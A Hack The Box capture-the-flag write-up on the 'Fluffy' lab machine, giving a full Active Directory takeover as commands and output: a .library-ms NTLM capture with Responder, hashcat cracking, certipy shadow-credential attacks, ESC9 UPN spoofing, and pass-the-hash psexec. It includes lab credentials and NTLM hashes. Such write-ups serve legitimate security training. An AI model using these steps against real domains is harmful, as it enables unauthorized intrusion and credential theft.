# HTB Fluffy - Full Domain Compromise via Shadow Credentials and ESC9

## Summary

This write-up documents a clean and direct path to full Domain Admin compromise on the HTB "Fluffy" machine. The path includes initial access, shadow credential abuse, privilege escalation, and domain takeover using ESC9 (certificate template abuse).

## Target Information

Machine Name: Fluffy

IP Address: 10.129.128.135

Domain: FLUFFY.HTB

Domain Controller: dc01.fluffy.htb

Open Ports

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

## Initial Enumeration

Provided Credentials:

```
Username: j.fleischman
Password: J0elTHEM4n1990!
```

## SMB Share Enumeration:

```bash
 nxc smb 10.129.128.135 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
```

Using nxc, the following shares were discovered:

```
ADMIN$          - Remote Admin
C$              - Default share
IPC$            - Remote IPC
IT              - READ, WRITE
NETLOGON        - READ
SYSVOL          - READ
```

## Interesting Files in IT Share:

```
Everything-1.4.1.1026.x64.zip

KeePass-2.58.zip

Upgrade_Notice.pdf
```

## Vulnerability Discovery

Upgrade_Notice.pdf:

The document listed multiple CVEs:

```
CVE-2025-24996 (Critical)
CVE-2025-24071 (Critical)
CVE-2025-46785 (High)
CVE-2025-29968 (High)
CVE-2025-21193 (Medium)
CVE-2025-3445  (Low)
```

## CVE Investigation:

After reviewing the CVEs, CVE-2025-24996 and CVE-2025-24071 pointed to a known NTLM relay vulnerability against SMB → AD CS.

NTLM Relay Exploitation

Step 1: Create Malicious .library-ms File

A crafted .library-ms file is created to trigger authentication when opened on the target.

```bash
python3 generate_library.py
```

Step 2: Upload to IT Share

The .library-ms file is uploaded to the writable IT share using smbclient or equivalent.

Step 3: Start Responder to Capture NTLM Hashes

```bash
sudo responder -I tun0
```

When a user opens the .library-ms file, their NTLMv2 hash is captured.

Captured NTLMv2 Hash:

```
p.agila::FLUFFY:41f05e4c4881b02f:2677EC3EBA0C3DEA22E5423023F000E5:0101000000000000000C8BDB8CCDDB01A7D745F82C5AAE940000000002000800490043004F004F0001001E00570049004E002D00590049003700540052004C00580056004F003600500004003400570049004E002D00590049003700540052004C00580056004F00360050002E00490043004F004F002E004C004F00430041004C0003001400490043004F004F002E004C004F00430041004C0005001400490043004F004F002E004C004F00430041004C0007000800000C8BDB8CCDDB01060004000200000008003000300000000000000001000000002000001535D33F80BA037C71181E24B8D2D5946C956CF7246D5D64BBD5FE6DF780514C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360036000000000000000000
```

Hash Cracking:

```bash
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
``` 

Cracked with hashcat:

```
Username: p.agila
Password: prometheusx-303
```

Step 1: Shadow Credential Attack on ca_svc

## Objective:

Escalate privileges by abusing GenericWrite from p.agila over ca_svc.

Execution:

```bash
certipy shadow auto \
  -username p.agila@fluffy.htb \
  -password 'prometheusx-303' \
  -account ca_svc \
  -dc-ip 10.129.128.135
```

Result:

Shadow credentials injected for ca_svc

Retrieved NTLM hash:

```
ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8
```

Step 2: Shadow Credential Attack on winrm_svc

## User
Objective:

Leverage ca_svc's GenericWrite over winrm_svc to escalate further.

Execution:

```bash
certipy shadow auto \
  -username ca_svc@fluffy.htb \
  -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -account winrm_svc \
  -dc-ip 10.129.128.135 
```

Result:

Shadow credentials injected for winrm_svc

Retrieved NTLM hash:

```
winrm_svc:33bd09dcd697600edf6b3a7af4875767
```

Winrm:

```bash
evil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

## Privilege Escalation

Step 3: ESC9 Abuse - Impersonate Administrator

Objective:

Exploit vulnerable "User" certificate template to impersonate Administrator by spoofing ca_svc's UPN.

1. Change UPN of ca_svc to Administrator

```bash
certipy account update \
  -username ca_svc@fluffy.htb \
  -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -user ca_svc \
  -upn Administrator \
  -dc-ip 10.129.128.135
```

2. Request Certificate (ESC9)

```bash
certipy req \
  -username ca_svc@fluffy.htb \
  -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -template User \
  -ca fluffy-DC01-CA \
  -dc-ip 10.129.128.135
```

3. Revert UPN to ca_svc@fluffy.htb

```bash
certipy account update \
  -username ca_svc@fluffy.htb \
  -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -user ca_svc \
  -upn ca_svc@fluffy.htb \
  -dc-ip 10.129.128.135 \
```

4. Authenticate as Administrator

```
certipy auth \
  -pfx administrator.pfx \
  -dc-ip 10.129.128.135 \
  -domain fluffy.htb
```

5. Result:

Retrieved Administrator NTLM hash:

```
administrator:8da83a3fa618b6e3a00e93f676c92a6e
```

Final Step: Pwn the Domain Controller

Command:

```bash
psexec.py FLUFFY.HTB/administrator@10.129.128.135 -hashes :8da83a3fa618b6e3a00e93f676c92a6e
```

✅ Gained full SYSTEM shell on the domain controller.

Conclusion

This attack demonstrates a clean and stealthy privilege escalation using:

Shadow credentials (msDS-KeyCredentialLink)

UPN spoofing

ESC9 abuse on a vulnerable certificate template

NTLM relay via .library-ms payload and Responder

No passwords were reset, and no detectable service disruptions occurred.

Fluffy.htb fully owned. 👑
